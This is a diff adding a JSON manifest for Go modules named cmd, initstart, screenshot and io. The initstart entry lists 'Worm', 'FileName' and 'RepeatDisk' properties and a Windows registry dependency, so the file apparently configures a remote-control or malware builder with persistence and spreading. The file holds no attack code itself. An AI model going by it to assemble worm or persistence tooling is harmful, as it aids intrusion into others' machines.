@@ -1,0 +1,42 @@
+[
+    {
+        "name" : "cmd",
+        "load" : "../libraries/cmd",
+        "var" : "wcmd",
+        "standard" : true,
+        "methods" : [],
+        "properties": [],
+        "requirements":[],
+        "info":["Interface: cmd", "State: Finish"]
+    },
+    {
+        "name" : "initstart",
+        "load" : "../libraries/initstart",
+        "var" : "istart",
+        "standard" : true,
+        "methods" : [],
+        "properties": ["Worm", "FileName", "RepeatDisk"],
+        "requirements":["golang.org/x/sys/windows/registry"],
+        "info":["State: Finish"]
+    },
+    {
+        "name" : "screenshot",
+        "load" : "../libraries/screenshot",
+        "var" : "scshot",
+        "standard" : true,
+        "methods" : [],
+        "properties": [],
+        "requirements":["go get github.com/kbinani/screenshot"],
+        "info":["Interface: screenshot", "State: Useless"]
+    },
+    {
+        "name" : "io",
+        "load" : "../libraries/io",
+        "var" : "iofs",
+        "standard" : true,
+        "methods" : [],
+        "properties": [],
+        "requirements":[],
+        "info":["Interface: io", "State: Developing"]
+    }
+]
